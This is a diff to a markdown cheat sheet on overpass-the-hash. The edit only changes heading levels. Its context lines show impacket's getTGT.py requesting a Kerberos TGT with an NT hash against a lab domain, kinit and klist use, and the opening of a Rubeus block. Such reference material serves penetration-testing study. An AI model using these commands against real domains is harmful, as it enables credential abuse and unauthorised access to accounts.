@@ -2,8 +2,7 @@
 
 > In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).
 
-
-### Using impacket
+## Using impacket
 
 ```bash
 root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
@@ -15,8 +14,7 @@ root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
 root@kali:~$ klist
 ```
 
-
-### Using Rubeus
+## Using Rubeus
 
 ```powershell
 # Request a TGT as the target user and pass it into the current session
